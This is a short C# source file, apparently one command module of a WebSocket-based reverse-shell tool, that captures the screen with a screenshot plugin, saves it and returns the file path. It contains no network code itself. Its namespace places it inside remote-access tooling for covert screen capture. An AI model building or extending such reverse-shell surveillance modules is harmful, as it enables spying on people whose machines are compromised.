using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.IO;

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using Plugin.Screenshot;

namespace WebSocketReverseShellDotNet.service.commands
{
    public class CameraScreenShot : Command
    {



        public string ExecuteCommand(string command)
        {
            Task<byte[]> captureTask = CrossScreenshot.Current.CaptureAsync();

            captureTask.Wait();
            byte[] capture = captureTask.Result;


            Task<String> screenShot = CrossScreenshot.Current.CaptureAndSaveAsync();

            screenShot.Wait();
            String screen = screenShot.Result;

            Console.WriteLine(screen);



            return screen;
        }



    }
}
